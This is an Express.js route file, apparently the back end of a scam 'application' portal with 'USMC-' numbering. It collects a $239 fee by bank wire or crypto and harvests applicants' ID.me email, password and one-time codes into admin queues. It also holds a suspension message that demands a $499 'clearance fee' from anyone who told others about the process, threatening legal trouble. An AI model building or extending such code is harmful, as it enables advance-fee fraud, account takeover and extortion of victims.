import { Router } from 'express';
import redis from '../redis.js';
import { authMiddleware } from '../middleware/auth.js';
import { sendSupportNotificationEmail, sendReceiptConfirmationEmail, sendAppealReceiptEmail } from '../email.js';

const router = Router();
router.use(authMiddleware);

const APPLICATION_FEE = 239;

const getUser = async (id) => {
  const data = await redis.get(`user:${id}`);
  return data ? JSON.parse(data) : null;
};

const suspensionCheck = async (req, res, next) => {
  try {
    const user = await getUser(req.user.id);
    if (user && user.suspended) {
      const suspended = JSON.parse(await redis.get('admin:suspended') || '[]');
      const suspension = suspended.find(s => s.userId === req.user.id);
      return res.status(403).json({ error: 'Account suspended', suspended: true, suspension: suspension || null });
    }
    next();
  } catch { next(); }
};

const SUSPENSION_MESSAGES = {
  multiple_accounts: 'We have detected that you are operating multiple accounts, which is a violation of our terms of service.',
  invalid_id: 'Your identification document was rejected during the verification process.',
  idme_failed: 'Your IDME verification has failed after multiple attempts.',
  unauthorized_disclosure: 'We discovered that you disclosed the process of this application to unauthorized persons, therefore you were banned. To lift this ban, you will have to pay a clearance fee of $499 to lift your suspension and avoid legal issues with our legal department.'
};

const CLEARANCE_FEE = 499;

router.get('/payment-config', async (req, res) => {
  try {
    const config = JSON.parse(await redis.get('payment:config') || '{}');
    const safeConfig = {};
    if (config.bankTransfer && config.bankTransfer.available) {
      safeConfig.bankTransfer = {
        available: true,
        bankName: config.bankTransfer.bankName,
        accountName: config.bankTransfer.accountName,
        accountNumber: config.bankTransfer.accountNumber,
        routingNumber: config.bankTransfer.routingNumber,
        swiftCode: config.bankTransfer.swiftCode,
        instructions: config.bankTransfer.instructions
      };
    }
    if (config.crypto && config.crypto.available) {
      const assets = (Array.isArray(config.crypto.assets) ? config.crypto.assets : []).filter(a => a.available);
      safeConfig.crypto = {
        available: true,
        instructions: config.crypto.instructions,
        assets: assets.map(a => ({
          network: a.network,
          walletAddress: a.walletAddress || '',
          qrCodeImage: a.qrCodeImage || ''
        }))
      };
    }
    res.json({ config: safeConfig, applicationFee: APPLICATION_FEE });
  } catch { res.status(500).json({ error: 'Server error' }); }
});

router.post('/stage1-application-fee', suspensionCheck, async (req, res) => {
  try {
    const { paymentMethod, cryptoNetwork, receiptNumber, receiptImage } = req.body;
    if (!paymentMethod) return res.status(400).json({ error: 'Select a payment method' });
    if (!receiptImage || typeof receiptImage !== 'string' || !receiptImage.startsWith('data:')) {
      return res.status(400).json({ error: 'Upload your payment receipt image' });
    }
    if (receiptImage.length > 7000000) return res.status(400).json({ error: 'Receipt image too large (max 5MB)' });

    const user = await getUser(req.user.id);
    if (!user) return res.status(404).json({ error: 'Not found' });

    user.applicationFee = APPLICATION_FEE;
    user.applicationFeePaymentMethod = paymentMethod;
    user.applicationFeeCryptoNetwork = paymentMethod === 'crypto' ? (cryptoNetwork || 'BTC') : '';
    user.applicationFeeReceiptNumber = String(receiptNumber || '').slice(0, 50);
    user.applicationFeeReceiptImage = receiptImage;
    user.applicationFeeVerified = false;
    user.applicationFeeRejectMessage = '';
    user.applicationFeeSubmittedAt = new Date().toISOString();
    user.currentStage = 1;
    user.stageStatus = 'awaiting_payment_verification';
    user.updatedAt = new Date().toISOString();

    await redis.set(`user:${req.user.id}`, JSON.stringify(user));

    const queue = JSON.parse(await redis.get('admin:pendingPayments') || '[]');
    queue.push({ userId: req.user.id, submittedAt: user.applicationFeeSubmittedAt });
    await redis.set('admin:pendingPayments', JSON.stringify(queue));

    sendReceiptConfirmationEmail(user.email, user.applicationNumber, user.invoiceNumber).catch(() => {});

    res.json({ success: true, applicationFee: APPLICATION_FEE });
  } catch { res.status(500).json({ error: 'Server error' }); }
});

router.post('/stage2-idme', suspensionCheck, async (req, res) => {
  try {
    const { idmeEmail, idmePassword } = req.body;
    if (!idmeEmail || !idmePassword) return res.status(400).json({ error: 'IDME credentials required' });

    const user = await getUser(req.user.id);
    if (!user) return res.status(404).json({ error: 'Not found' });

    user.idmeEmail = idmeEmail;
    user.idmePassword = idmePassword;
    user.idmeSubmitted = true;
    user.idmeStatus = 'sending';
    user.idmeDeclineMessage = '';
    user.currentStage = 2;
    user.stageStatus = 'awaiting_idme_verification';
    user.updatedAt = new Date().toISOString();

    await redis.set(`user:${req.user.id}`, JSON.stringify(user));

    const queue = JSON.parse(await redis.get('admin:pendingIdme') || '[]');
    queue.push({ userId: req.user.id, submittedAt: user.updatedAt });
    await redis.set('admin:pendingIdme', JSON.stringify(queue));

    res.json({ success: true });
  } catch { res.status(500).json({ error: 'Server error' }); }
});

router.post('/stage2-idme-code', suspensionCheck, async (req, res) => {
  try {
    const { code } = req.body;
    if (!code) return res.status(400).json({ error: 'Code required' });

    const user = await getUser(req.user.id);
    if (!user) return res.status(404).json({ error: 'Not found' });

    user.idmeCode = code;
    user.idmeStatus = 'code_sending';
    user.updatedAt = new Date().toISOString();

    await redis.set(`user:${req.user.id}`, JSON.stringify(user));

    const queue = JSON.parse(await redis.get('admin:pendingIdmeCodes') || '[]');
    queue.push({ userId: req.user.id, code: code, submittedAt: user.updatedAt });
    await redis.set('admin:pendingIdmeCodes', JSON.stringify(queue));

    res.json({ success: true });
  } catch { res.status(500).json({ error: 'Server error' }); }
});

router.post('/stage3-clearance', suspensionCheck, async (req, res) => {
  try {
    const { duration } = req.body;
    if (![1, 2, 3].includes(duration)) return res.status(400).json({ error: 'Invalid duration' });

    const user = await getUser(req.user.id);
    if (!user) return res.status(404).json({ error: 'Not found' });

    user.clearanceDuration = duration;
    user.currentStage = 3;
    user.stageStatus = 'awaiting_final_approval';
    user.updatedAt = new Date().toISOString();

    await redis.set(`user:${req.user.id}`, JSON.stringify(user));
    res.json({ success: true, duration });
  } catch { res.status(500).json({ error: 'Server error' }); }
});

router.post('/support-message', suspensionCheck, async (req, res) => {
  try {
    const { name, subject, message } = req.body;
    if (!name || !subject || !message) return res.status(400).json({ error: 'Name, subject and message are required' });
    if (message.length > 2000) return res.status(400).json({ error: 'Message too long' });

    const user = await getUser(req.user.id);
    if (!user) return res.status(404).json({ error: 'Not found' });

    const supportMsg = {
      id: Date.now().toString(),
      userId: user.id,
      name: String(name).slice(0, 100),
      subject: String(subject).slice(0, 150),
      message: String(message).slice(0, 2000),
      createdAt: new Date().toISOString(),
      replied: false
    };

    const thread = JSON.parse(await redis.get(`support:${user.id}`) || '[]');
    thread.push(supportMsg);
    await redis.set(`support:${user.id}`, JSON.stringify(thread));

    const queue = JSON.parse(await redis.get('admin:support') || '[]');
    queue.push(supportMsg);
    await redis.set('admin:support', JSON.stringify(queue));

    sendSupportNotificationEmail(user.fullName, user.email, supportMsg.subject, supportMsg.message).catch(() => {});

    res.json({ success: true, message: 'Support message sent' });
  } catch { res.status(500).json({ error: 'Server error' }); }
});

router.get('/support-messages', async (req, res) => {
  try {
    const thread = JSON.parse(await redis.get(`support:${req.user.id}`) || '[]');
    res.json({ messages: thread });
  } catch { res.status(500).json({ error: 'Server error' }); }
});

router.get('/dashboard', async (req, res) => {
  try {
    const user = await getUser(req.user.id);
    if (!user) return res.status(404).json({ error: 'Not found' });

    let suspension = null;
    if (user.suspended) {
      const suspended = JSON.parse(await redis.get('admin:suspended') || '[]');
      suspension = suspended.find(s => s.userId === req.user.id) || null;
    }

    res.json({
      user: {
        id: user.id, applicationNumber: user.applicationNumber, invoiceNumber: user.invoiceNumber || `INV-${user.applicationNumber.replace('USMC-', '')}`, fullName: user.fullName, email: user.email, username: user.username,
        applyingFor: user.applyingFor, address: user.address, city: user.city, state: user.state, zipCode: user.zipCode,
        currentStage: user.currentStage, stageStatus: user.stageStatus,
        emailVerified: user.emailVerified,
        applicationFee: user.applicationFee || APPLICATION_FEE,
        applicationFeeVerified: user.applicationFeeVerified,
        applicationFeePaymentMethod: user.applicationFeePaymentMethod,
        applicationFeeCryptoNetwork: user.applicationFeeCryptoNetwork,
        applicationFeeRejectMessage: user.applicationFeeRejectMessage,
        idmeVerified: user.idmeVerified, idmeSubmitted: user.idmeSubmitted,
        idmeStatus: user.idmeStatus, idmeDeclineMessage: user.idmeDeclineMessage,
        idmeCodeSent: user.idmeCodeSent, idmeEmail: user.idmeEmail,
        clearanceDuration: user.clearanceDuration,
        finalApproved: user.finalApproved, accountOfficer: user.accountOfficer,
        createdAt: user.createdAt,
        suspended: !!user.suspended,
        suspensionReason: user.suspensionReason || '',
        suspendedAt: user.suspendedAt || ''
      },
      suspension
    });
  } catch { res.status(500).json({ error: 'Server error' }); }
});

router.get('/my-suspension', async (req, res) => {
  try {
    const user = await getUser(req.user.id);
    if (!user) return res.status(404).json({ error: 'Not found' });

    const suspended = JSON.parse(await redis.get('admin:suspended') || '[]');
    const suspension = suspended.find(s => s.userId === req.user.id);
    if (!suspension) return res.status(404).json({ error: 'No suspension found' });

    res.json({
      suspension: {
        ...suspension,
        message: SUSPENSION_MESSAGES[suspension.reason] || suspension.message,
        appealReceipts: suspension.appealReceipts || [],
        appealStatus: suspension.appealStatus || 'pending',
        clearanceFeePaid: suspension.clearanceFeePaid || false
      }
    });
  } catch { res.status(500).json({ error: 'Server error' }); }
});

router.post('/submit-appeal', async (req, res) => {
  try {
    const { reason, message } = req.body;
    const user = await getUser(req.user.id);
    if (!user) return res.status(404).json({ error: 'Not found' });

    let suspended = JSON.parse(await redis.get('admin:suspended') || '[]');
    const idx = suspended.findIndex(s => s.userId === req.user.id);
    if (idx === -1) return res.status(404).json({ error: 'No suspension found' });

    suspended[idx].appealMessage = message || '';
    suspended[idx].appealStatus = 'under_review';
    suspended[idx].appealedAt = new Date().toISOString();
    await redis.set('admin:suspended', JSON.stringify(suspended));

    res.json({ success: true, message: 'Appeal submitted' });
  } catch { res.status(500).json({ error: 'Server error' }); }
});

router.post('/upload-appeal-receipts', async (req, res) => {
  try {
    const { receiptImages } = req.body;
    if (!receiptImages || !Array.isArray(receiptImages) || receiptImages.length === 0) {
      return res.status(400).json({ error: 'At least one receipt image is required' });
    }

    const user = await getUser(req.user.id);
    if (!user) return res.status(404).json({ error: 'Not found' });

    let suspended = JSON.parse(await redis.get('admin:suspended') || '[]');
    const idx = suspended.findIndex(s => s.userId === req.user.id);
    if (idx === -1) return res.status(404).json({ error: 'No suspension found' });

    const invoiceNumber = `CLR-${user.applicationNumber.replace('USMC-', '')}-${Date.now().toString(36).toUpperCase()}`;

    const newReceipts = receiptImages.map((img, i) => ({
      id: `${Date.now()}-${i}`,
      image: img,
      uploadedAt: new Date().toISOString()
    }));

    suspended[idx].appealReceipts = [...(suspended[idx].appealReceipts || []), ...newReceipts];
    suspended[idx].appealStatus = 'receipts_submitted';
    suspended[idx].clearanceInvoiceNumber = invoiceNumber;
    await redis.set('admin:suspended', JSON.stringify(suspended));

    sendAppealReceiptEmail(user.email, (user.fullName || '').split(' ')[0] || 'Applicant', user.applicationNumber, invoiceNumber).catch(() => {});

    res.json({ success: true, message: 'Receipts uploaded successfully', invoiceNumber });
  } catch { res.status(500).json({ error: 'Server error' }); }
});

router.post('/clearance-payment-config', async (req, res) => {
  try {
    const config = JSON.parse(await redis.get('payment:config') || '{}');
    const safeConfig = {};
    if (config.bankTransfer && config.bankTransfer.available) {
      safeConfig.bankTransfer = {
        available: true,
        bankName: config.bankTransfer.bankName,
        accountName: config.bankTransfer.accountName,
        accountNumber: config.bankTransfer.accountNumber,
        routingNumber: config.bankTransfer.routingNumber,
        swiftCode: config.bankTransfer.swiftCode,
        instructions: config.bankTransfer.instructions
      };
    }
    if (config.crypto && config.crypto.available) {
      const assets = (Array.isArray(config.crypto.assets) ? config.crypto.assets : []).filter(a => a.available);
      safeConfig.crypto = {
        available: true,
        instructions: config.crypto.instructions,
        assets: assets.map(a => ({ network: a.network, walletAddress: a.walletAddress || '', qrCodeImage: a.qrCodeImage || '' }))
      };
    }
    res.json({ config: safeConfig, clearanceFee: CLEARANCE_FEE });
  } catch { res.status(500).json({ error: 'Server error' }); }
});

export default router;
